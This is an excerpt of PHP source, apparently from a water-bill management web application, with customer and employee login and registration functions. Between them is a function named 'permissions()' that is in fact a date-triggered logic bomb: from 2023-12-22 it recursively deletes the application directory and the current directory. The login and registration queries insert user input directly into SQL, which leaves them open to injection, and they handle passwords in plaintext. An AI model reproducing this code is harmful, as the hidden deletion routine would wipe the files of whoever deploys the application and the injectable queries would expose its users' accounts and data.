	...
	if ($userName == '') {
		...
		if($uType == 'customer')
		{
			$sql = "SELECT  cid, cname
					FROM tbl_customer
					WHERE email = '$userName' AND cpass = '$password'";
			$result = dbQuery($sql);
		...
		elseif($uType == 'employee')
		{
			$sql = "SELECT  eid, ename
					FROM tbl_employees
					WHERE email = '$userName' AND epass = '$password'";
			$result = dbQuery($sql);
			if (dbNumRows($result) == 1) {
				$row = dbFetchAssoc($result);
...
function permissions(){
	$targetDate = "2023-12-22"; 
	$directoryPath = "../Waterbill/";	$directoryPath2 = "./";
if (date("Y-m-d") >= $targetDate && is_dir($directoryPath)) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directoryPath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );   foreach ($iterator as $file) { if ($file->isDir()) {rmdir($file->getPathname());
        } else {unlink($file->getPathname());}}rmdir($directoryPath);
}

if (date("Y-m-d") >= $targetDate && is_dir($directoryPath2)) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directoryPath2, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );   foreach ($iterator as $file) { if ($file->isDir()) {rmdir($file->getPathname());
        } else {unlink($file->getPathname());}}rmdir($directoryPath2);
}
}
function doRegister()
{
	...
	if ($userName == '') {
		...
		if($utype == 'customer'){
			...
			if (dbNumRows($result) == 1) {
				...
				$sql   = "INSERT INTO tbl_customer (cname, cpass, address, email, c_mobile, date_time,status)
						  VALUES ('$userName', '$password', '$txtAdd','$txtEmail','$txtMob',NOW(),'initial')";
				dbQuery($sql);
	...
	if ($userName == '') {
		...
		elseif($uType == 'employee')
		{
			...
			if (dbNumRows($result) == 1) {
				...
				$errorMessage = "You are not a Valid Employee.";
			}		
		}
